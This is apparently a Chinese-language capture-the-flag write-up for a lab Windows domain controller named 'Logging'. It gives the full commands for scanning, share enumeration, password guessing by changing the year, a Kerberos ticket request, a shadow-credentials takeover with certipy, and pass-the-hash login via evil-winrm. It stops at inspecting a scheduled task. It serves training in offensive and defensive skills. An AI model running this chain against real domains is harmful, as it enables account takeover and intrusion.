# Logging #
## nmap探测 ##
#### `nmap -sT --min-rate 10000 -p- 10.129.42.196`
![](./Logging/1.png)

#### `nmap -sT -sC -sV -O -A -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389 10.129.42.196`
![](./Logging/2.png)

#### 时钟存在偏差clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
#### 使用`sudo ntpdate 10.129.42.196`进行同步，注意需要先关闭时间自动更新`sudo systemctl stop systemd-timesyncd`（为了严谨同步完时间最好用nmap再探测一遍）
#### 配置host绑定域名`sudo sed -i '1i 10.129.42.196 DC01.logging.htb logging.htb' /etc/hosts`
![](./Logging/3.png)

## Web探测 ##
![](./Logging/4.png)

#### `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://logging.htb/ -x asp,html,aspx,txt`
![](./Logging/5.png)

#### 除了80端口还有8530/8531也是http服务但都是空白页，暂时不知道有什么用
![](./Logging/6.png)

#### 尝试子域名爆破`wfuzz -c -w /usr/share/wordlists/subdomain.txt -u "http://logging.htb" -H "host:FUZZ.logging.htb" --hw 55`也没跑出什么东西

## 域信息收集 ##
#### Web线索中断，使用初始账号`wallace.everette / Welcome2026@`对服务进行探测
`enum4linux-ng -A -u 'wallace.everette' -p 'Welcome2026@' logging.htb`
![](./Logging/7.png)

#### Logs、NETLOGON、SYSVOL可访问，挨个检查
![](./Logging/8.png)

#### 在IdentitySync_Trace_20260219.log中发下一个账号密码，但是根据日志信息密码应该是过期了
![](./Logging/9.png)

#### 试一下，果然失败了，先记录。继续使用初始账号进行域信息收集
![](./Logging/10.png)

#### `bloodhound-python -u 'wallace.everette' -p 'Welcome2026@' -d 'logging.htb' -c All --zip --dns-tcp -ns 10.129.42.196`
![](./Logging/15.png)

#### svc_recovery账号对msa_health$账号有完全的控制权限，msa账号又属于REMOTE MANAGEMENT USERS组。到这里攻击路径其实已经清晰了，但是svc账号属于Protected组，关于这个组的信息如下：
![](./Logging/13.png)

#### 目前还没有svc账号的密码，这里卡了很久……最后还是看了Writeup。才反应过来密码是有规律的，初始账号有年份2026，svc_recovery的密码中也有年份2025。将Em3rg3ncyPa\$\$2025改成Em3rg3ncyPa\$\$2026

#### 获取svc_recovery的TGT`impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip 10.129.42.196`
#### `export KRB5CCNAME=svc_recovery.ccache`
![](./Logging/16.png)

#### 再用svc_recovery创建msa_health$的影子凭证`certipy-ad shadow auto -u 'svc_recovery@logging.htb' -k -no-pass -account 'msa_health$' -dc-ip 10.129.42.196 -target DC01.logging.htb`
![](./Logging/17.png)

#### 远程登录`evil-winrm -i 10.129.42.196 -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'`
![](./Logging/18.png)

## 提权 ##
#### 阅读moitor.ps1有计划任务
![](./Logging/19.png)

#### 查看任务信息，依次执行
```
$service = New-Object -ComObject "Schedule.Service"
$service.Connect()
$task = $service.GetFolder("\").GetTask("UpdateChecker Agent")
$task.Definition | fl *
```
关键信息：
![](./Logging/20.png)

![](./Logging/21.png)